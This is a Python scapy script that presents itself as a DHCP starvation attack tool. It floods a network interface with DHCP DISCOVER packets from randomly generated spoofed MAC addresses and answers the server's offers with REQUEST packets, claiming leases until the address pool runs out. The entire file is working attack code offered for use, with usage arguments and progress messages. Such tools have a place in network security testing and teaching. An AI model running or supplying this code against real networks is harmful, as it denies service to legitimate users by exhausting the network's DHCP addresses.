#! /usr/bin/python3
from scapy.all import *

import threading
import argparse
import sys
import time
import random

def build_dhcp_request(sender_macaddr, dhcp_server_ipaddr, xid, offered_ip):
    # Build DHCP REQUEST packet
    dhcp_request = (
        Ether(src=sender_macaddr, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=sender_macaddr.replace(':',''), xid=xid, flags=0x8000) /
        DHCP(options=[
            ("message-type", "request"),
            ("requested_addr", offered_ip),
            ("server_id", dhcp_server_ipaddr),
            "end"
        ])
    )

    return dhcp_request

def packet_handler(iface, packet, sender_macaddr):
    # Checks DHCP header to find DHCP OFFER packet (2: DHCP OFFER)
    if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 2:
        # Gathering some info
        dhcp_xid = packet[BOOTP].xid
        offered_ip = packet[BOOTP].yiaddr
        sender_ipaddr = packet[BOOTP].siaddr

        # Build DHCP REQUEST packet
        dhcp_request_packet = build_dhcp_request(sender_macaddr, sender_ipaddr, dhcp_xid, offered_ip)

        # Send it
        try:
            sendp(dhcp_request_packet, iface=iface, verbose=0)
        except Exception as dhcp_request_error:
            print(f"[x] Sending DHCP REQUEST packet failed with error: {dhcp_request_error}")
            sys.exit(1)

def send_discover_packets(dhcp_discover, iface):
    try:
        sendp(dhcp_discover, iface=iface, verbose=0)
    except Exception as dhcp_discover_error:
        print(f"[x] Sending DHCP DISCOVER packet failed with error: {dhcp_discover_error}")
        sys.exit(1)

def build_dhcp_discover(sender_macaddr):
    # Generate a random transaction ID
    xid = random.randint(1, 0xFFFFFFFF)

    # Build DHCP DISCOVER packet
    dhcp_discover = (
        Ether(src=sender_macaddr, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        # flags=0x8000 in a DHCP Discover packet refers to a specific bit in the BOOTP header that controls how the DHCP server should respond to the client.
        # You're telling the DHCP server: "Please send your reply as a broadcast."
        # This is useful when the client: Doesn’t yet have an IP address / Can’t receive unicast packets reliably / Is in early boot stages (like PXE booting).
        BOOTP(chaddr=sender_macaddr.replace(':',''), xid=xid, flags=0x8000) /
        DHCP(options=[("message-type", "discover"), "end"])
    )

    return dhcp_discover

def packet_sniffer(iface, sender_macaddr):
    # Use prn= inside sniff() to process each packet as it's captured.
    # Use store=False in sniff() to avoid storing packets in memory unnecessarily.
    # sniff() only allows prn to be a function that takes one argument: the packet. To work around this, you can use a lambda function to pass additional arguments to your packet handler.
    # udp and (port 67 or 68): Sniff all DHCP packets
    try:
        packets = sniff(iface=iface, filter="udp and (port 67 or 68)", prn=lambda pkt: packet_handler(iface, pkt, sender_macaddr), store=False)
    except Exception as packet_sniffing_error:
        print(f"[x] Sniffing DHCP packets failed with error: {packet_sniffing_error}")
        sys.exit(1)

def generate_random_mac():
    # The first byte is usually set to 02 to indicate a locally administered MAC
    # Each byte is an integer between 0x00 and 0xff (0 to 255), representing one part of the MAC address.
    # :02x means:
        # 02: pad with zeros to ensure it's 2 characters wide.
        # x:  format the number as lowercase hexadecimal.
        
    mac_addess = [0x02,
                  random.randint(0x00, 0x7f),
                  random.randint(0x00, 0xff),
                  random.randint(0x00, 0xff),
                  random.randint(0x00, 0xff),
                  random.randint(0x00, 0xff)]
    return ':'.join(f'{byte:02x}' for byte in mac_addess)

def main():
    # Create parser object (ArgumentDefaultsHelpFormatter ensures default values are shown in the help text)
    parser = argparse.ArgumentParser(description="Simple python script for DHCP STARVATION Attack", formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    # Add arguments
    parser.add_argument("-i", "--iface", metavar="", default="eth0", required=True, help="Network interface")
    parser.add_argument("-c", "--count", metavar="", default="10", help="DHCP DISCOVER packet counts")

    # Use arguments
    args = parser.parse_args()

    # Counter
    counter = int(args.count)

    try:
        print("[*] Starting DHCP STARVATION attack...\n")

        # Build random mac address for sniffer function
        sniff_random_macaddr = generate_random_mac()

        # Start sniffing in a seperate thread
        sniff_thread = threading.Thread(target=packet_sniffer, args=(args.iface,sniff_random_macaddr))
        sniff_thread.daemon = True
        sniff_thread.start()

        # Give the sniffer a moment to initialize
        time.sleep(0.5)

        while counter > 0:
            # Build random mac address for sender
            random_macaddr = generate_random_mac()

            # Build DHCP DISCOVER packet
            dhcp_discover_packet = build_dhcp_discover(random_macaddr)

            # Send DHCP DISCOVER packet
            send_discover_packets(dhcp_discover_packet, args.iface)
            print(f"[+] Sent DHCP Discover with MAC {random_macaddr} ({counter})")

            time.sleep(0.5)
            counter -= 1

    except KeyboardInterrupt:
        print("\n[x] Sniffing DHCP packets failed with error: CTRL+C DETECTED")
        print("[x] Script stopped.")
        sys.exit(1)

main()